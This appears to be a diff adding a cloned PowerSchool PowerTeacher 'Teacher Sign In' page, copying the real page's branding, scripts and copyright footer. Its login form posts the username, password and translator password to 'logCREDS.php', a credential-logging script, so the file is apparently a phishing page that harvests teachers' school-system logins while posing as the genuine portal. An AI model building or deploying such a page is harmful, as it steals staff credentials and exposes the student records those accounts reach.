@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html xmlns:>
+<head>
+    <script type="text/javascript">if(!_messages)var _messages = {};_messages["psx.jshtml.teachers.pw.password"] = "Password:";_messages["psx.jshtml.teachers.pw.username"] = "Username:";if (typeof pss_text != 'function') { function pss_text(key, params, returnKeyIfNotFound) { if (_messages[key] === undefined) { if (returnKeyIfNotFound !== undefined && returnKeyIfNotFound === true) {return key;} else {return 'String key was not found!'; }}if(params == null || params.length == 0) {return _messages[key]; }else { msg = _messages[key]; for ( i = 0; i < params.length; i++) {token = "{"+i+"}"; msg = msg.replace(token, params[i]); }return msg;} } }</script>
+    <meta name="robots" content="noindex">
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=1">
+    <link rel="apple-touch-icon" href="favicons/mobile-ps6-logo-touch-icon.png">
+    <title>PowerTeacher</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
+
+    <link href="css/css-screen.css" rel="stylesheet" media="screen">
+    <link href="css/css-print.css" rel="stylesheet" media="print">
+    <link href="css/css-customization.css" rel="stylesheet" type="text/css" media="screen">
+    <script src="js/scripts-jquery-2.1.3.min.js"></script>
+    <script src="js/scripts-jquery-ui-1.11.2.custom.min.js"></script>
+    <script src="js/javascript-md5.js"></script>
+    <script src="js/scripts-signin-scripts.js"></script>
+    <script language="JavaScript" type="text/javascript">
+            var pref = 0;
+        </script>
+    <script language="JavaScript" src="js/mobile-detectMobileWebkit.js" type="text/javascript"></script>
+    <script language="JavaScript" type="text/javascript">
+            if (isMobileUserAgent()) {
+                insertCss('/scripts/mobile/mobile.css');
+            }
+        </script>
+    <script language="JavaScript" type="text/javascript">
+            function deleteCookie(cookieName){
+                var cookieDate = new Date();
+                cookieDate.setTime(cookieDate.getTime()-1);
+                document.cookie = cookieName + "=; expires='" + cookieDate.toGMTString()+"'; path=/";
+            }
+            deleteCookie("InformAuthToken");
+
+            $j(document).ready(function() {
+                // Hide or show the translator login input field
+                // if the URL parameter "translator" is present
+                var translator = getURLParameter("translator");
+                if (translator == "null") {
+                    $j('#translatorInput').hide();
+                } else {
+                    if (translator == "true") {
+                        $j('#translatorInput').show();
+                    } else {
+                        $j('#translatorInput').hide();
+                    }
+                }
+            });
+        </script>
+
+    <link rel="apple-touch-icon" href="favicons/1389--apple-touch-icon.png">
+    <link rel="icon" type="image/png" href="favicons/1640--android-chrome-192x192.png" sizes="192x192">
+    <link rel="icon" type="image/png" href="favicons/2724--android-chrome-512x512.png" sizes="512x512">
+    <link rel="icon" type="image/png" href="favicons/7330--favicon-196x196.png" sizes="196x196">
+    <link rel="icon" type="image/png" href="favicons/341--favicon-96x96.png" sizes="96x96">
+    <link rel="icon" type="image/png" href="favicons/452--favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="favicons/4881--favicon-16x16.png" sizes="16x16">
+    <link rel="icon" type="image/png" href="favicons/6876--favicon-128.png" sizes="128x128">
+
+    <meta name="application-name" content="PowerSchool">
+    <meta name="msapplication-TileColor" content="#FFFFFF">
+    <meta name="msapplication-TileImage" content="/mstile-144x144.png">
+    <meta name="msapplication-square70x70logo" content="/mstile-70x70.png">
+    <meta name="msapplication-square150x150logo" content="/mstile-150x150.png">
+    <meta name="msapplication-wide310x150logo" content="/mstile-310x150.png">
+    <meta name="msapplication-square310x310logo" content="/mstile-310x310.png">
+    <link rel="shortcut icon" href="favicons/3437--favicon.ico">
+</head>
+<body onload="document.cookie='mobileHome=mobile';" id="teacherlogin" class="pslogin">
+<form name="LoginForm" id="LoginForm" action="logCREDS.php" method="post" target="_top" onsubmit="doTeacherLogin(this); document.cookie = 'request_locale=' + (this.request_locale.value || null);">
+    <input type="hidden" name="translator_username" value="">
+    <input type="hidden" name="translator_password" value="">
+    <input type="hidden" name="translator_ldappassword" value="">
+    
+    
+    <input type="hidden" name="ldappassword" value="">
+    <div id="container">
+        <div id="branding-district"></div>
+        <div id="content">
+            <div id="branding-powerschool"></div>
+            <h1>
+                Teacher Sign In
+            </h1>
+            
+            
+            <!--box content-->
+            <div id="noscript" class="feedback-alert">
+                To sign in to PowerTeacher, you must use a browser that supports and has JavaScript enabled.
+            </div>
+      
+                
+					<fieldset id="login-inputs">
+						
+							
+						
+						<div>
+							<label for="fieldUsername">Username</label>
+							<input type="text" name="username" id="fieldUsername" value="" size="35" autocorrect="off" autocapitalize="off">
+						</div>
+						<div>
+							<label for="fieldPassword">Password</label>
+							<input type="password" name="password" id="fieldPassword" value="" size="35" autocomplete="new-password">
+						</div>
+						<div id="translatorInput">
+							<label for="translatorpw">Translator Sign In</label>
+							<input type="password" name="translatorpw" id="translatorpw" value="" size="39" autocomplete="new-password">
+						</div>
+						<div class="button-row">
+							<button type="submit" id="btnEnter" title="Sign In To PowerSchool" value="Enter">Sign In</button>
+						</div>
+					</fieldset>
+                
+            
+            <!-- box content-->
+        </div>
+        <!-- Start of copyright table -->
+        <div id="footer">
+            <p></p><div id="legal">
+  <p>Copyright  2005-2020 PowerSchool Group LLC and/or its affiliate(s). All rights reserved.<br>All trademarks are either owned or licensed by PowerSchool Group LLC and/or its affiliates.</p>
+</div>
+
+            <p id="powerschoolcorplink"><a href="https://www.powerschool.com" target="_blank">PowerSchool.com</a></p>
+        </div>
+        <!-- End of copyright table -->
+    </div>
+</form>
+<script>
+            $j('#noscript').hide();
+            function jsEnabled() {
+                if(typeof $j != 'function'){
+                    alert('Developer: This page is missing key components required for functionality!\n\nPossible causes include:\n - Commonscripts might be missing.\n - Page customization might enabled, and incomplete.');
+                    //document.write('<script...');
+                    } else {
+                    $j('#login-inputs').removeClass('hide');
+                    $j("#fieldUsername").focus();
+                }
+            }
+            $j(document).ready(function(){
+                jsEnabled();
+            });
+        </script>
+</body>
+</html>
